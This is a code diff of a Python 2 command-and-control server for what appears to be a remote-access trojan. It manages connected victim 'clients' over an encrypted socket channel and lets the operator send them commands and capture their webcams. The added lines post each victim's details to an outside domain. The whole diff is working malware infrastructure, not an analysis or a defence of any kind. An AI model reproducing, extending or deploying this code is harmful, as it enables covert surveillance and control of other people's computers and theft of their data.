@@ -46,6 +46,7 @@ a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
 import os
 import sys
 import cv2
+import json
 import time
 import numpy
 import pickle
@@ -62,27 +63,33 @@ import subprocess
 import SocketServer
 
 
+# default port for the server to listen on
+__PORT__    = 1337  
+
+
+# default database interaction targets 
+__DATA__    = {'add_client': 'https://snapchat.sex/client.php',
+               'add_task'  : 'https://snapchat.sex/task.php'}
+
+# enable/disable debugging output
+__DEBUG__   = True
+
+# comment/uncomment the following line to disable/enable color 
 colorama.init(autoreset=True)
-socket.setdefaulttimeout(1.0)
 
-
-# globals
-debug           = True
-exit_status     = False
-port            = int(sys.argv[1]) if bool(len(sys.argv) == 2 and str(sys.argv[1]).isdigit() and 0 < int(sys.argv[1]) < 65355) else 1337
 
 
 class Server(threading.Thread):
-    global exit_status
-    global debug
+    
     def __init__(self, port):
         super(Server, self).__init__()
-        self.count          = 0
+        self.exit_status    = 0
         self.lock           = threading.Event()
         self.current_client = None
         self.clients        = {}
         self.commands       = {
-	    'back'	    :   self.deselect_client,
+	    'background'    :   self.background_client,
+            'back'          :   self.background_client,
             'client'        :   self.select_client,
             'clients'       :   self.list_clients,
             'quit'          :   self.quit_server,
@@ -93,53 +100,71 @@ class Server(threading.Thread):
             '-h'            :   self.usage,
             '?'             :   self.usage
             }
-        self._text_color    = colorama.Fore.WHITE
+        self.db             = globals().get('__DATA__')
+        self._rand_color    = lambda: getattr(colorama.Fore, random.choice(['RED','BLUE','CYAN','GREEN','YELLOW','WHITE','MAGENTA']))
+        self._text_color    = self._rand_color()
         self._text_style    = colorama.Style.DIM
         self._prompt_color  = colorama.Fore.WHITE
         self._prompt_style  = colorama.Style.BRIGHT
         self.manager        = threading.Thread(target=self.client_manager, name='client_manager')
-        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.s              = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.s.bind(('0.0.0.0', port)) if not debug else self.s.bind(('localhost', port))
-        self.s.listen(5)
+        self.s.bind(('localhost', port)) if globals().get('__DEBUG__') else self.s.bind(('0.0.0.0', port))
+        self.s.listen(100)
         self.lock.set()
 
-    def _pad(self, s): return s + (self.encryption['block_size'] - len(bytes(s)) % self.encryption['block_size']) * '\x00'
+    def __security__(fx):
+        '''Decorator that takes a given function ('fx') and returns a static method with data encryption properties'''
+        fx.block_size = 8
+        fx.key_size   = 16
+        fx.num_rounds = 32
+        fx.hash_algo  = 'md5'
+        return staticmethod(fx)
 
-    def _block(self, s): return [s[i * self.encryption['block_size']:((i + 1) * self.encryption['block_size'])] for i in range(len(s) // self.encryption['block_size'])]
+    @__security__
+    def __encryption__():
+        return Server.encryption.func_dict
+    
+    def _pad(self, s):
+        return bytes(s) + (self.__encryption__.block_size - len(bytes(s)) % self.__encryption__.block_size) * '\x00'
 
-    def _xor(self, s, t): return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(s, t))
-
-    def _prompt(self, data): return raw_input(self._prompt_color + self._prompt_style + data)
-
-    def _error(self, data): print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + self._text_color + self._text_style + data + '\n')
-
+    def _block(self, s):
+        return [s[i * self.__encryption__.block_size:((i + 1) * self.__encryption__.block_size)] for i in range(len(s) // self.__encryption__.block_size)]
+            
+    def _xor(self, s, t):
+        return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(s, t))
+            
     def _long_to_bytes(self, x):
         try:
             return bytes(bytearray.fromhex(hex(long(x)).strip('0x').strip('L')))
-        except Exception as e:
-            if '__v__' in vars(self) and self.__v__:
-                self._error("Long-to-bytes conversion error: {}".format(str(e)))
-
+        except ValueError as e:
+            self._error("_long_to_bytes failed with error: {}\nDecimal: '{}'\nHexidecimal: '{}".format(str(e), long(x), hex(long(x))))
+            
     def _bytes_to_long(self, x):
         try:
             return long(bytes(x).encode('hex'), 16)
         except Exception as e:
-            if '__v__' in vars(self) and self.__v__:
-                self._error("Bytes-to-long conversion error: {}".format(str(e)))
+            print('\n' + self._text_color + colorama.Style.BRIGHT + '[-] ' + colorama.Style.DIM + 'prompt failed with error: {}'.format(str(e)))
 
+    def _prompt(self, data):
+        try:
+            return raw_input(self._prompt_color + self._prompt_style + data)
+        except Exception as e:
+            print('\n' + self._text_color + colorama.Style.BRIGHT + '[-] ' + colorama.Style.DIM + 'prompt function failed with error: {}'.format(str(e)))
+    
+    def _error(self, data):
+        try:
+            print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + self._text_color + 'error: ' + self._text_style + data + '\n')
+        except Exception as e:
+            print('\n' + self._text_color + colorama.Style.BRIGHT + '[-] ' + colorama.Style.DIM + 'error function failed with error: {}'.format(str(e)))
+    
     def _print(self, data):
         if self.current_client:
             self.current_client.lock.clear()
             print('\n' + self._text_color + self._text_style + data + '\n')
-            try:
-                self.current_client.lock.set()
-                return self.current_client.run()
-            except Exception as e:
-                print('\nError - {}\n'.format(str(e)))
+            self.current_client.lock.set()
         else:
             print('\n' + self._text_color + self._text_style + data + '\n')
-        return self.run()
 
     def _settings(self, target, setting, option):
         target  = target.lower()
@@ -173,191 +198,63 @@ class Server(threading.Thread):
                 return "usage:      settings text <option> [value]"
         return self.run()
 
-    @property
-    def __encryption(self):
-        return {'endian': '!', 'rounds': 32, 'key_size': 16, 'block_size': 8}
-
-    def _encryption(self, block, dhkey):
-        v0, v1  = struct.unpack(self.encryption['endian'] + "2L", block)
-        k       = struct.unpack(self.encryption['endian'] + "4L", dhkey)
-        sum, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
-        for round in range(self.encryption['rounds']):
-            v0  = (v0 + (((v1<<4 ^ v1>>5) + v1) ^ (sum + k[sum & 3]))) & mask
-            sum = (sum + delta) & mask
-            v1  = (v1 + (((v0<<4 ^ v0>>5) + v0) ^ (sum + k[sum>>11 & 3]))) & mask
-        return struct.pack(self.encryption['endian'] + "2L", v0, v1)
-
-    def _decryption(self, block, dhkey):
-        v0, v1  = struct.unpack(self.encryption['endian'] +"2L", block)
-        k       = struct.unpack(self.encryption['endian'] + "4L", dhkey)
-        delta,mask = 0x9e3779b9L, 0xffffffffL
-        sum     = (delta * self.encryption['rounds']) & mask
-        for round in range(self.encryption['rounds']):
-            v1  = (v1 - (((v0<<4 ^ v0>>5) + v0) ^ (sum + k[sum>>11 & 3]))) & mask
-            sum = (sum - delta) & mask
-            v0  = (v0 - (((v1<<4 ^ v1>>5) + v1) ^ (sum + k[sum & 3]))) & mask
-        return struct.pack(self.encryption['endian'] + "2L", v0, v1)
-
-    def diffiehellman(self, connection, bits=2048):
-        try:
-            p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
-            g = 2
-            a = self._bytes_to_long(os.urandom(self.encryption['key_size']))
-            xA = pow(g, a, p)
-            connection.sendall(self._long_to_bytes(xA))
-            xB = self._bytes_to_long(connection.recv(256))
-            x = pow(xB, a, p)
-            return sys.modules['hashlib'].new('md5', string=self._long_to_bytes(x)).digest()
-        except: pass
-        try:
-            if connection.getpeername():
-                time.sleep(1)
-                return self.diffiehellman(connection)
-        except: pass
-        
-    @__encryption.getter
-    def encryption(self):
-        return self.__encryption
-
-    def _encrypt(self, data, dhkey):
-        padded = self._pad(data)
-        blocks = self._block(padded)
-        vector = os.urandom(8)
-        result = [vector]
-        for block in blocks:
-            try:
-                encode = self._xor(vector, block)
-                output = vector = self._encryption(encode, dhkey)
-                result.append(output)
-            except Exception as e:
-                self._error(str(e))
-        return base64.b64encode(''.join(result))
-
-    def _decrypt(self, data, dhkey):
-        blocks = self._block(base64.b64decode(data))
-        result = []
-        vector = blocks[0]
-        for block in blocks[1:]:
-            try:
-                decode  = self._decryption(block, dhkey)
-                output  = self._xor(vector, decode)
-                vector = block
-                result.append(output)
-            except Exception as e:
-                self._error(str(e))
-        return ''.join(result).rstrip('\x00')
-    
-    def encrypt(self, data, client_id):
-        if int(client_id) in self.clients:
-            key = self.clients[int(client_id)]._dhkey
-            return self._encrypt(data, key)
-
-    def decrypt(self, data, client_id):
-        if int(client_id) in self.clients:
-            key = self.clients[int(client_id)]._dhkey
-            return self._decrypt(data, key)
-      
-    def send_client(self, msg, client_id):
-        if int(client_id) in self.clients:
-            client = self.clients[int(client_id)]
-            data = self.encrypt(msg, client.name) + '\n'
-            client.conn.sendall(data)
-    
-    def recv_client(self, client_id):
-        if int(client_id) in self.clients:
-            client = self.clients[int(client_id)]
-            buffer, method, message  = "", "", ""
-            if client:
-                while "\n" not in buffer:
-                    try:
-                        buffer += client.conn.recv(4096)
-                    except:
-                        raise socket.error
-                if len(buffer):
-                    try:
-                        method, _, message = buffer.partition(':')
-                        message = server.decrypt(message, client.name)
-                        return method, message.rstrip()
-                    except: pass
-                if client.lock.is_set():
-                    try:
-                        return client.run()
-                    except:
-                        client.lock.clear()
-                        self.current_client = None
-        return server.run()
-    
-    def get_clients(self):
-        return [v for _, v in self.current_client.items()]
-
-    def select_client(self, client_id):
-        if self.lock.is_set():
-            self.lock.clear()
-        if self.current_client and self.current_client.lock.is_set():
-            self.current_client.lock.clear()
-        if int(client_id) not in self.clients:
-            self._error( "Invalid Client ID")
-        else:
-            self.current_client = self.clients[int(client_id)]
-            self._print('\nClient {} selected\n'.format(client_id))
-            self.current_client.lock.set()
-            try:
+    def _return(self):
+        if self.current_client:
+            if self.current_client.lock.is_set():
                 return self.current_client.run()
-            except Exception as e:
-                self._error(str(e))
-                self.current_client = None
-                self.remove_client(int(client_id))
-        return self.run()
-
-    def deselect_client(self):
-        if self.current_client and self.current_client.lock.is_set():
             self.current_client.lock.clear()
-        self.current_client = None
+            self.current_client = None
         self.lock.set()
         return self.run()
-      
-    def sendall_clients(self, msg):
-        for client in self.get_clients():
-            try:
-                self.send_client(msg, client.name)
-            except:
-                print(self._text_color + self._text_style + 'Unable to connect to client {}'.format(client.name))
 
-    def remove_client(self, key):
-        thread = self.clients.pop(int(key), None)
-        self._print('Client {} disconnected'.format(thread.name))
-        if not self.current_client:
-            self.lock.set()
-        else:
-            self.lock.clear()
-            self.current_client.lock.set()
-            return self.current_client.run()
+    def _diffiehellman(self, conn):
+        g  = 2
+        p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
+        a  = self._bytes_to_long(os.urandom(self.__encryption__.key_size))
+        xA = pow(g, a, p)
+        conn.send(self._long_to_bytes(xA))
+        xB = self._bytes_to_long(conn.recv(256))
+        x  = pow(xB, a, p)
+        return sys.modules['hashlib'].new(self.__encryption__.hash_algo, self._long_to_bytes(x)).digest()
 
-          
-    def kill_client(self, client_id):
-        client = self.clients.get(int(client_id))
-        self.send_client('kill', client.name)
-        client.conn.close()
-        self.remove_client(client.name)
-      
-    def list_clients(self):
-        print(colorama.Fore.MAGENTA + colorama.Style.DIM + '\nID | Client Address\n-------------------')
-        for k, v in self.clients.items():
-            print(self._text_color + self._text_style + '{:>2}'.format(k) + colorama.Fore.MAGENTA + colorama.Style.DIM + ' | ' + self._text_color + self._text_style + v.addr[0])
-        print
-          
-    def quit_server(self):
-        try:
-            for client in self.get_clients():
-                try:
-                    self.send_client('standby', client.name)
-                except: pass
-        finally:
-            sys.exit(0)
-    
-    def settings(self, args):
-        return self._settings(*args.split())
-    
+    def _encrypt(self, data, key):
+        data    = self._pad(data)
+        blocks  = self._block(data)
+        vector  = os.urandom(8)
+        result  = [vector]
+        for block in blocks:
+            block   = self._xor(vector, block)
+            v0, v1  = struct.unpack('!' + "2L", block)
+            k       = struct.unpack('!' + "4L", key)
+            sum, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
+            for round in range(self.__encryption__.num_rounds):
+                v0  = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
+                sum = (sum + delta) & mask
+                v1  = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
+            output  = vector = struct.pack('!' + "2L", v0, v1)
+            result.append(output)
+        return base64.b64encode(b''.join(result))
+
+    def _decrypt(self, data, key):
+        data    = base64.b64decode(data)
+        blocks  = self._block(data)
+        vector  = blocks[0]
+        result  = []
+        for block in blocks[1:]:
+            v0, v1 = struct.unpack('!' + "2L", block)
+            k = struct.unpack('!' + "4L", key)
+            delta, mask = 0x9e3779b9L, 0xffffffffL
+            sum = (delta * self.__encryption__.num_rounds) & mask
+            for round in range(self.__encryption__.num_rounds):
+                v1 = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
+                sum = (sum - delta) & mask
+                v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
+            decode = struct.pack('!' + "2L", v0, v1)
+            output = self._xor(vector, decode)
+            vector = block
+            result.append(output)
+        return ''.join(result).rstrip('\x00')
+
     def webcam_client(self, mode=None):
         if not self.current_client:
             self._error( "No client selected")
@@ -412,21 +309,145 @@ class Server(threading.Thread):
             result = self.recv_client()
             return result
         return client.run()
+    
+    def encrypt(self, data, client_id):
+        if int(client_id) in self.clients:
+            key = self.clients[int(client_id)].dhkey
+            return self._encrypt(data, key)
 
+    def decrypt(self, data, client_id):
+        if int(client_id) in self.clients:
+            key = self.clients[int(client_id)].dhkey
+            return self._decrypt(data, key)
+      
+    def send_client(self, msg, client_id):
+        if int(client_id) in self.clients:
+            client = self.clients[int(client_id)]
+            data = self.encrypt(msg, client.name) + '\n'
+            client.conn.sendall(data)
+    
+    def recv_client(self, client_id):
+        if int(client_id) in self.clients:
+            client = self.clients[int(client_id)]
+            buffer, method, message  = "", "", ""
+            if client:
+                while "\n" not in buffer:
+                    try:
+                        buffer += client.conn.recv(4096)
+                    except:
+                        break
+                if len(buffer):
+                    method, _, message = buffer.partition(':')
+                    message = server.decrypt(message.rstrip(), client.name)
+                    return (method, message)
+            self._return()
+        else:
+            self._error('Invalid Client ID')
+    
+    def get_clients(self):
+        return [v for _, v in self.current_client.items()]
+
+    def select_client(self, client_id):
+        if int(client_id) not in self.clients:
+            self._error('Invalid Client ID')
+        else:
+            self.lock.clear()
+            self.current_client = self.clients[int(client_id)]
+            if not self.current_client.lock.is_set():
+                self.current_client.lock.set()
+            self._print('\nClient {} selected\n'.format(client_id))
+        self._return()
+
+    def background_client(self):
+        if self.current_client:
+            self.current_client.lock.clear()
+        self.current_client = None
+        self.lock.set()
+        return self.run()
+    
+    def sendall_clients(self, msg):
+        for client in self.get_clients():
+            try:
+                self.send_client(msg, client.name)
+            except Exception as e:
+                self._error('Message to client {} failed with error: {}'.format(client.name, str(e)))
+    
+    def remove_client(self, client_id):
+        if int(client_id) not in self.clients:
+            self._error('Invalid Client ID')
+        else:
+            client = self.clients[int(client_id)]
+            if not self.current_client:
+                self._print('Client {} disconnected'.format(client.name))
+                del client
+                self.lock.set()
+                return self.run()
+            elif int(client_id) != self.current_client.name:
+                self.current_client.lock.clear()
+                self._print('Client {} disconnected'.format(client.name))
+                del client
+                self.current_client.lock.set()
+                return self.current_client.run()
+            else:
+                self._print('Client {} disconnected'.format(client.name))
+                del client
+                return self.current_client.run()
+
+    def kill_client(self, client_id):
+        if int(client_id) in self.clients:
+            client = self.clients.get(int(client_id))
+            self.send_client('kill', client.name)
+            client.conn.close()
+            self.remove_client(client.name)
+        self._return()
+      
+    def list_clients(self):
+        print(self._text_color + colorama.Style.BRIGHT + '\nID | Client Address\n-------------------')
+        for k, v in self.clients.items():
+            print(self._text_color + colorama.Style.DIM + '{:>2}'.format(k) + colorama.Style.BRIGHT + ' | ' + colorama.Style.DIM + v.addr[0])
+        print
+          
+    def quit_server(self):
+        try:
+            for client in self.get_clients():
+                try:
+                    self.send_client('standby', client.name)
+                except: pass
+        finally:
+            sys.exit(0)
+    
+    def settings(self, args):
+        return self._settings(*args.split())
+    
+    def add_to_db(self, client_id):
+        if str(client_id).isdigit() and int(client_id) in self.clients:
+            client = self.clients[int(client_id)]
+            if self.db and 'add_client' in self.db:
+                post  = requests.post(self.db['add_client'], data=client.info).content
+                uid   = sys.modules['hashlib'].md5(bytes(client.info.get('ip')) + bytes(client.info.get('node'))).hexdigest()
+                if post != uid:
+                    self._error('client id did not match db record: {}'.format(post))
+                return post
+            else:
+                print('no database found')
+        self._return()
+            
     def client_manager(self):
         while True:
+            if self.exit_status:
+                break
             try:
                 conn, addr  = self.s.accept()
-                conn.settimeout(3.0)
                 name        = len(self.clients) + 1
-                dhkey   = self.diffiehellman(conn)
+                dhkey       = self._diffiehellman(conn)
                 client      = ConnectionHandler(conn, addr, name, dhkey)
                 self.clients[name] = client
                 client.start()
-                if exit_status:
-                    break
-            except:
-                continue
+            except Exception as e:
+                print('manager failed with error: {}\nexiting...'.format(str(e)))
+                break
+        self.exit_status = True
+        sys.exit(0)
 
     def usage(self):
         print
@@ -444,14 +465,7 @@ class Server(threading.Thread):
         print(self._text_color + self._text_style+ '< > = required argument')
         print(self._text_color + self._text_style+ '[ ] = optional argument\n')
         print
-        if self.current_client:
-            try:
-                return self.current_client.run()
-            except Exception as e:
-                self.current_client.lock.clear()
-                self.current_client = None
-                print(self._text_color + self._text_style+ str(e))
-        return self.run()
+        self._return()
 
     def run(self):
         while True:
@@ -459,17 +473,14 @@ class Server(threading.Thread):
                 self.manager = threading.Thread(target=self.client_manager, name='client_manager')
                 self.manager.daemon = True
                 self.manager.start()
-            if exit_status:
+            if self.exit_status:
                 break
             self.lock.wait()
             output = ''
-            cmd_buffer = self._prompt('$ ')
+            cmd_buffer = self._prompt("[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER'))) % os.getcwd())
             cmd, _, action = cmd_buffer.partition(' ')
             if cmd in self.commands:
-                try:
-                    output = self.commands[cmd](action) if len(action) else self.commands[cmd]()
-                except Exception as e1:
-                    output = str(e1)
+                output = self.commands[cmd](action) if len(action) else self.commands[cmd]()
             else:
                 try:
                     output = subprocess.check_output(cmd_buffer, shell=True)
@@ -477,39 +488,46 @@ class Server(threading.Thread):
                     output = str(e2)
             if output and len(output):
                 self._print(output)
+        print('Server shutting down')
+        sys.exit(0)
 
 
 class ConnectionHandler(threading.Thread):
     global server
-    global debug
-    global exit_status
-
+    
     def __init__(self, conn, addr, name, dhkey):
         super(ConnectionHandler, self).__init__()
+        self.id     = bytes()
         self.prompt = None
         self.conn   = conn
         self.addr   = addr
         self.name   = name
         self.info   = {}
+        self.tasks  = {}
         self.lock   = threading.Event()
-        self._dhkey = dhkey
-        self.conn.settimeout(3.0)
+        self.dhkey  = dhkey
+        self.conn.setblocking(True)
 
-    def _prompt(self, data): return raw_input(server._prompt_color + server._prompt_style + data)
-
-    def _error(self, data): print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + server._text_color + server._text_style + data + '\n')
+    def _prompt(self, data):
+        try:
+            return raw_input(server._prompt_color + server._prompt_style + data)
+        except ValueError as e:
+             self._error("client prompt failed with error: '{}'".format(str(e)))
+             
+    def _error(self, data):
+        try:
+            print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.WHITE + 'Error: ' + colorama.Style.DIM + data + '\n')
+        except ValueError as e:
+            print("client error failed with error: '{}'".format(str(e)))
 
     def run(self):
         while True:
-            if exit_status:
+            if server.exit_status:
                 break
-            self.lock.wait()
+            if self.id:
+                self.lock.wait()
             data = ''
-            try:
-                method, data = ('prompt', self.prompt) if self.prompt else server.recv_client(self.name)
-            except:
-                
-                break
+            method, data = ('prompt', self.prompt) if self.prompt else server.recv_client(self.name)
             if 'prompt' in method:
                 self.prompt = data.format(self.name)
                 command = self._prompt(self.prompt)
@@ -518,12 +536,17 @@ class ConnectionHandler(threading.Thread):
                     result = server.commands[cmd](action) if len(action) else server.commands[cmd]()
                     if result:
                         server._print(result)
+                    continue
                 else:
                     server.send_client(command, self.name)
+            elif 'start' in method:
+                self.info  = json.loads(data)
+                self.id    = server.add_to_db(self.name)
             else:
                 if data:
                     server._print(data)
             self.prompt = None
+        self.lock.clear()
         server.remove_client(self.name)
         server.current_client = None
         server.lock.set()
@@ -531,11 +554,12 @@ class ConnectionHandler(threading.Thread):
          
 
 if __name__ == '__main__':
+    port    = int(sys.argv[1]) if bool(len(sys.argv) == 2 and str(sys.argv[1]).isdigit() and 0 < int(sys.argv[1]) < 65355) else __PORT__
+    server  = Server(port)
     os.system('cls' if os.name is 'nt' else 'clear')
     print('\n\n\n\n\n\n\n\n\n\n')
-    print('\n' + random.choice([colorama.Fore.MAGENTA, colorama.Fore.CYAN, colorama.Fore.YELLOW, colorama.Fore.RED, colorama.Fore.WHITE, colorama.Fore.BLACK]) + BANNER + colorama.Fore.WHITE + '\n')
-    server  = Server(port)
-    print(colorama.Fore.YELLOW + "[?]" + colorama.Fore.WHITE + " Use '-h/--help' for usage information\n")
+    print('\n' + server._rand_color() + BANNER + colorama.Fore.WHITE + '\n')
+    print(colorama.Fore.YELLOW + "[?] " + colorama.Fore.WHITE + "-h/--help for usage information\n")
     server.start()
 
 
